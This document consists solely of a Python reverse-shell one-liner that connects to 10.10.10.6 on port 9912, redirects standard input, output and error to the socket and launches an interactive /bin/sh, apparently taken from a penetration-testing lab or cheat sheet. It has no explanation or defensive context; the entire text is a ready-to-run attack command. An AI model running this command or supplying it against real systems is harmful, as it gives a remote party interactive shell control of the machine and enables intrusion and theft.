python3 -c 'import socket, subprocess, os; newSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM); newSocket.connect(("10.10.10.6", 9912)); os.dup2(newSocket.fileno(), 0); os.dup2(newSocket.fileno(), 1); os.dup2(newSocket.fileno(), 2); subprocess.call(["/bin/sh", "-i"])'
